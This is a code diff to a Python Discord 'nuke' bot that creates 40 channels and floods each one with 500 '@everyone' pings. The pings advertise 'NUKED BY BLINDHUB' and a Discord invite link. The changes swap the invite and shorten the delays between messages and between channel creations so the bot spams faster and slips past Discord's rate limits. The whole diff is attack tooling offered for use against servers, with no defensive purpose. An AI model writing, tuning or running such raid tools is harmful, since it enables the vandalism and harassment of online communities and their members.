@@ -6,7 +6,7 @@ import asyncio
 # Configuration
 prefix = "!"
 channel_name = "nuked by blindhub"
-spam_message = "@everyone NUKED BY BLINDHUB https://discord.gg/yQqDNsf4XA"
+spam_message = "@everyone NUKED BY BLINDHUB https://discord.gg/srUu6NmuTR "
 channels_to_create = 40
 pings_per_channel = 500
 
@@ -23,7 +23,7 @@ async def spam_channel(channel):
             await channel.send(spam_message)
             if (i + 1) % 10 == 0:
                 print(f"Sent {i + 1} messages in {channel.name}")
-            await asyncio.sleep(0.8)  # small delay to reduce rate limit chances
+            await asyncio.sleep(0.3)  # small delay to reduce rate limit chances
         except Exception as e:
             print(f"Failed to send message in {channel.name}: {e}")
             break
@@ -58,7 +58,7 @@ async def nuke(ctx):
             channel = await guild.create_text_channel(f"{channel_name}-{i}")
             created_channels.append(channel)
             print(f"Created channel: {channel.name}")
-            await asyncio.sleep(0.3)  # delay to reduce rate limit
+            await asyncio.sleep(0.1)  # delay to reduce rate limit
         except Exception as e:
             print(f"Failed to create channel {i}: {e}")
 
